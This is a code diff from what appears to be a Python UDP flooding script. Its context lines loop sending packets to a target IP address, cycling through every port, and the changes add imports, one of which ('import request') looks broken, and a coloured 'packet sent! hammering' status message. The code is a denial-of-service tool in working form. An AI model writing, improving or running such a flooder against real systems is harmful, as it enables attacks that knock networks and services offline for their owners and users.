@@ -3,6 +3,10 @@ import os
 import time
 import socket
 import random
+import threading 
+import logging 
+import urllib
+import request
 #Code Time
 from datetime import datetime
 now = datetime.now()
@@ -74,7 +78,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
      if port == 65534:
        port = 1
 
